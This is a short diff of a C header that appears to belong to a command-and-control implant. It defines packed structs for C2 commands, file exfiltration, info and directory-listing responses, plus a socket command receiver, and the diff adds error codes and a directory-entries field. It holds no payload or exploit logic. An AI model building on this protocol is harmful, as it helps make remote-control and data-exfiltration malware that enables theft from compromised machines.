@@ -19,6 +19,8 @@ enum file_status
     READ_ERROR,
     WRITE_ERROR,
     STAT_ERROR,
+    NOT_FILE,
+    NOT_DIRECTORY
 };
 
 struct __attribute__((__packed__)) c2_req
@@ -65,7 +67,7 @@ struct __attribute__((__packed__)) inf_res
 
 struct __attribute__((__packed__)) dir_req
 {
-    struct c2_res header;
+    struct c2_req header;
     uint16_t path_len;
     char path[];
 };
@@ -74,12 +76,12 @@ struct __attribute__((__packed__)) dir_res
 {
     struct c2_res header;
     uint8_t status;
-    int link_count;
+    char dents[];
 };
 
 struct exf_res *exf_res_init(uint32_t file_size, enum file_status status);
 struct inf_res *inf_res_init(enum file_status status);
-struct dir_res *dir_res_init(enum file_status, int link_count);
+struct dir_res *dir_res_init(enum file_status);
 struct c2_req *receive_command(int sockfd);
 
 #endif
